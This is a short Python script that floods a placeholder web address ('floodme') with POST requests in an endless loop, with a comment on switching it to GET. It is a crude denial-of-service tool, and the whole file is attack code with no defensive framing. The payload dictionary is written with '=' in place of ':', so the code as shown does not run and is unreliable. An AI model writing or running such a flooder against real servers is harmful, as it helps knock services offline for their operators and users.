import requests
import json


def main():

    root_link = 'https://examle.com/blabla/floodme' 

    payload = {'param1'='value1', 'param2'='value2'}   

    while 1 == 1: 

        r = requests.post(root_link, json=payload)
       
        #easy to make get instead post just by deleting data (json) 


if __name__ == '__main__':
    main()
